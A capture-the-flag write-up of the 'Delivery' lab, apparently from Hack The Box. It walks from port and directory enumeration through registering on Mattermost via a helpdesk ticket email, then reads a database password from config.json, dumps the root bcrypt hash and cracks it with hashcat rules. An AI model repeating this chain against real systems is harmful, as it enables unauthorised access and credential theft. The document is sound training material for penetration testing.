## Delivery

### Lab Details 

- Difficulty: Easy
- Type: Web App, MariaDB, Password Bruteforce,  Linux

#### Enumeration
- run nmap 
```
PORT      STATE    SERVICE REASON      VERSION
22/tcp    open     ssh     syn-ack     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCq549E025Q9FR27LDR6WZRQ52ikKjKUQLmE9ndEKjB0i1qOoL+WzkvqTdqEU6fFW6AqUIdSEd7GMNSMOk66otFgSoerK6MmH5IZjy4JqMoNVPDdWfmEiagBlG3H7IZ7yAO8gcg0RRrIQjE7XTMV09GmxEUtjojoLoqudUvbUi8COHCO6baVmyjZRlXRCQ6qTKIxRZbUAo0GOY8bYmf9sMLf70w6u/xbE2EYDFH+w60ES2K906x7lyfEPe73NfAIEhHNL8DBAUfQWzQjVjYNOLqGp/WdlKA1RLAOklpIdJQ9iehsH0q6nqjeTUv47mIHUiqaM+vlkCEAN3AAQH5mB/1
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAiAKnk2lw0GxzzqMXNsPQ1bTk35WwxCa3ED5H34T1yYMiXnRlfssJwso60D34/IM8vYXH0rznR9tHvjdN7R3hY=
|   256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEV5D6eYjySqfhW4l4IF1SZkZHxIRihnY6Mn6D8mLEW7
80/tcp    open     http    syn-ack     nginx 1.14.2
|_http-title: Welcome
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.2
4762/tcp  filtered unknown no-response
4764/tcp  filtered unknown no-response
8065/tcp  open     http    syn-ack     Golang net/http server
| http-methods: 
|_  Supported Methods: GET
|_http-title: Mattermost
|_http-favicon: Unknown favicon MD5: 6B215BD4A98C6722601D4F8A985BF370
| http-robots.txt: 1 disallowed entry 
|_/
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, max-age=31556926, public
|     Content-Length: 3108
|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
|     Content-Type: text/html; charset=utf-8
|     Last-Modified: Sun, 27 Jul 2025 00:36:02 GMT
|     X-Frame-Options: SAMEORIGIN
|     X-Request-Id: pc6o77pqfiydpprd3n7pn1ibwc
|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
|     Date: Sun, 27 Jul 2025 00:55:26 GMT
|     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta name="robots" content="noindex, nofollow"><meta name="referrer" content="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Mattermost"><meta name="format-detection" content="telephone=no"><link re
|   GenericLines, Help, RTSPRequest, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, max-age=31556926, public
|     Content-Length: 3108
|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
|     Content-Type: text/html; charset=utf-8
|     Last-Modified: Sun, 27 Jul 2025 00:36:02 GMT
|     X-Frame-Options: SAMEORIGIN
|     X-Request-Id: ai9gji7yu385if17f1za5jqokw
|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
|     Date: Sun, 27 Jul 2025 00:55:06 GMT
|     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta name="robots" content="noindex, nofollow"><meta name="referrer" content="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Mattermost"><meta name="format-detection" content="telephone=no"><link re
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Date: Sun, 27 Jul 2025 00:55:07 GMT
|_    Content-Length: 0
18976/tcp filtered unknown no-response
31556/tcp filtered unknown no-response
34246/tcp filtered unknown no-response
39509/tcp filtered unknown no-response
39610/tcp filtered unknown no-response
42088/tcp filtered unknown no-response
42190/tcp filtered unknown no-response
43206/tcp filtered unknown no-response
51211/tcp filtered unknown no-response
53759/tcp filtered unknown no-response
58073/tcp filtered unknown no-response
59113/tcp filtered unknown no-response
```
- port 80 and 8065 are running HTTP
- investigate port 80
    - upon visting port 80 it shows the delivery home page and it contains a button to contact page 
    - click on the contact page times out but provided the URL `helpdesk.delivery.htb`
    - add that URL to `/etc/hosts/`
    - accessing `helpdesk.delivery.htb` takes use to the Support Center - Support Ticket System page 
    - we can create a ticket and view it
- investigate port 8065 
    - upon visting port 8065 the page shows a login page to the application MatterMost
    - searched for default credential to no prevail
- enumerate the file directory and sudomain of `http://helpdesk.delivery.htb`
```
ffuf -u http://helpdesk.delivery.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt

index.php               [Status: 200, Size: 4933, Words: 781, Lines: 103, Duration: 126ms]
account.php             [Status: 200, Size: 37319, Words: 6847, Lines: 625, Duration: 186ms]
captcha.php             [Status: 200, Size: 3106, Words: 13, Lines: 20, Duration: 78ms]
logout.php              [Status: 302, Size: 13, Words: 1, Lines: 1, Duration: 75ms]
view.php                [Status: 200, Size: 5263, Words: 852, Lines: 107, Duration: 78ms]
web.config              [Status: 200, Size: 2197, Words: 830, Lines: 49, Duration: 85ms]
.                       [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 111ms]
manage.php              [Status: 200, Size: 63, Words: 6, Lines: 3, Duration: 199ms]
offline.php             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 181ms]
include.php             [Status: 403, Size: 169, Words: 4, Lines: 8, Duration: 74ms]
logo.php                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 111ms]
open.php                [Status: 200, Size: 8133, Words: 2038, Lines: 178, Duration: 142ms]
include.asp             [Status: 403, Size: 169, Words: 4, Lines: 8, Duration: 95ms]
include_files.php       [Status: 403, Size: 169, Words: 4, Lines: 8, Duration: 96ms]
include.html            [Status: 403, Size: 169, Words: 4, Lines: 8, Duration: 96ms]
include_program.asp     [Status: 403, Size: 169, Words: 4, Lines: 8, Duration: 108ms]
include_stories.asp     [Status: 403, Size: 169, Words: 4, Lines: 8, Duration: 138ms]
:: Progress: [17129/17129] :: Job [1/1] :: 467 req/sec :: Duration: [0:00:55] :: Errors: 0 ::
```

#### Initial Foothold
- upon successfully creating a ticket on `helpdesk.delivery.htb`, the application provides us with an email address that we can use to add additional information to the ticket if we wish to
- we can attempt to register a new user account on `Mattermost` with the email address thats provided when new ticket is raised
![[email address.png]]
![[sign up.png]]
![[confirmation email.png]]
- we can then confirm the email and login to `Mattermost`
![[internal home.png]]
- the credential list stated in the chat history
- `ssh` into target using found credential
#### Privilege Escalation
 - once logged in loaded and run `linpeas.sh`
```
 <snip>
 ╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                                                        
   0 lrwxrwxrwx 1 root       root          4 Dec 26  2020 /bin/sh -> dash                                                                                                           
1.5M -rwxr-xr-x 1 root       root       1.5M Oct 24  2020 /lib/systemd/systemd
144K -rwxr-xr-x 1 root       root       143K Oct 24  2020 /lib/systemd/systemd-journald
228K -rwxr-xr-x 1 root       root       227K Oct 24  2020 /lib/systemd/systemd-logind
 56K -rwxr-xr-x 1 root       root        55K Oct 24  2020 /lib/systemd/systemd-timesyncd
664K -rwxr-xr-x 1 root       root       663K Oct 24  2020 /lib/systemd/systemd-udevd
 85M -rwxrwxr-x 1 mattermost mattermost  85M Dec 18  2020 /opt/mattermost/bin/mattermost
<snip>
```
- show the directory for `mattermost` located at `/opt/mattermost`
- search for config of `mattermost` and its located at `mattermost/config/config.json`
- below is the connection string to `mysql`
```
    "SqlSettings": {
        "DriverName": "mysql",
        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
        "DataSourceReplicas": [],
        "DataSourceSearchReplicas": [],
        "MaxIdleConns": 20,
        "ConnMaxLifetimeMilliseconds": 3600000,
        "MaxOpenConns": 300,
        "Trace": false,
        "AtRestEncryptKey": "n5uax3d4f919obtsp1pw1k5xetq1enez",
        "QueryTimeout": 30,
        "DisableDatabaseSearch": false
    },
```
- we can attempt to connect to the database using the credential found
```
maildeliverer@Delivery:/opt/mattermost/config$ mysql -u mmuser -pCrack_The_MM_Admin_PW -h localhost

MariaDB [(none)]> SHOW databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mattermost         |
+--------------------+
2 rows in set (0.000 sec)


MariaDB [(none)]> use mattermost;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [mattermost]> show tables;
+------------------------+
| Tables_in_mattermost   |
+------------------------+
| Audits                 |
| Bots                   |
| ChannelMemberHistory   |
| ChannelMembers         |
| Channels               |
| ClusterDiscovery       |
| CommandWebhooks        |
| Commands               |
| Compliances            |
| Emoji                  |
| FileInfo               |
| GroupChannels          |
| GroupMembers           |
| GroupTeams             |
| IncomingWebhooks       |
| Jobs                   |
| Licenses               |
| LinkMetadata           |
| OAuthAccessData        |
| OAuthApps              |
| OAuthAuthData          |
| OutgoingWebhooks       |
| PluginKeyValueStore    |
| Posts                  |
| Preferences            |
| ProductNoticeViewState |
| PublicChannels         |
| Reactions              |
| Roles                  |
| Schemes                |
| Sessions               |
| SidebarCategories      |
| SidebarChannels        |
| Status                 |
| Systems                |
| TeamMembers            |
| Teams                  |
| TermsOfService         |
| ThreadMemberships      |
| Threads                |
| Tokens                 |
| UploadSessions         |
| UserAccessTokens       |
| UserGroups             |
| UserTermsOfService     |
| Users                  |
+------------------------+
46 rows in set (0.000 sec)


MariaDB [mattermost]> select * from Users \G;
<snip>
*************************** 6. row ***************************
                Id: dijg7mcf4tf3xrgxi5ntqdefma
          CreateAt: 1608992692294
          UpdateAt: 1609157893370
          DeleteAt: 0
          Username: root
          Password: $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO
          AuthData: NULL
       AuthService: 
             Email: root@delivery.htb
     EmailVerified: 1
          Nickname: 
         FirstName: 
          LastName: 
          Position: 
             Roles: system_admin system_user
    AllowMarketing: 1
             Props: {}
       NotifyProps: {"channel":"true","comments":"never","desktop":"mention","desktop_sound":"true","email":"true","first_name":"false","mention_keys":"","push":"mention","push_status":"away"}
LastPasswordUpdate: 1609157893370
 LastPictureUpdate: 0
    FailedAttempts: 0
            Locale: en
          Timezone: {"automaticTimezone":"Africa/Abidjan","manualTimezone":"","useAutomaticTimezone":"true"}
         MfaActive: 0
         MfaSecret: 
<snip>
```

- we found the root hash in the database
- run hash identify the hash is 
```
 $ cat hash.txt | hashid                                              
Analyzing '$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
```
- we can attempt to crack it using hashcat however the chat history on `mattermost` mentioned `PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.`
- hinted that we might have to mutate the passphrase
```
$ echo PleaseSubscribe! | hashcat -r /usr/share/hashcat/rules/best64.rule --stdout > output.txt

$ hashcat -m 3200 hash.txt output.txt
```
- use `su root` to escalate the privilege to root user
```
maildeliverer@Delivery:/opt/mattermost/config$ su root
Password: 
root@Delivery:/opt/mattermost/config# whoami
root
```

#### Resources
- Pentest osTicket: https://github.com/Legoclones/pentesting-osTicket
#### Lesson Learned
- need to understand the context of each application and form a overall view of the system running on target
